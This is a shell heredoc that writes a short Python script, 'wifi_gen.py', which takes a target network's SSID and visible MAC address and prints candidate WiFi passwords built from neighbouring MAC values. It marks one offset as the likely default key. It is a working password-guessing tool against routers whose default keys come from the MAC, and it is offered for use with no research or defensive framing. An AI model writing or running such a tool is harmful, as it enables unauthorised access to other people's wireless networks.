cat <<EOF > wifi_gen.py
def generate_wifi_passwords():
    print("-" * 45)
    print("   WIFI KEY GEN - ADVANCED OFFSET EDITION   ")
    print("-" * 45)
    
    ssid = input("[?] SSID: ")
    mac_input = input("[?] Visible MAC (from phone): ")
    
    mac = mac_input.replace(":", "").replace("-", "").replace(" ", "").upper()
    
    if len(mac) != 12:
        print("[!] Error: Invalid MAC length.")
        return

    # Base Correction (4A -> 48)
    if mac.startswith("4A"):
        base_mac = "48" + mac[2:]
    else:
        base_mac = mac
        
    prefix = base_mac[:-2]
    visible_byte = int(base_mac[-2:], 16)

    print(f"\n[*] Target: {ssid}")
    print(f"[*] Logic: Searching for Base Interface (LAN Offset)")
    print("-" * 45)
    print(f"{'ID':<4} | {'Potential Pass':<15} | {'Note'}")
    print("-" * 45)

    # We generate a wider range around the visible MAC
    # Especially looking back (up to -10) to find the LAN MAC
    for i in range(-10, 6):
        current_byte = (visible_byte + i) % 256
        potential_pass = prefix + hex(current_byte)[2:].upper().zfill(2)
        
        note = ""
        if i == 0: note = "[VISIBLE WIFI MAC]"
        if i == -6: note = "[!!!] HIGH PROBABILITY (LAN BASE)" # This is your 5A!
        
        print(f"{i+11:<4} | {potential_pass:<15} | {note}")

if __name__ == "__main__":
    generate_wifi_passwords()
EOF
  
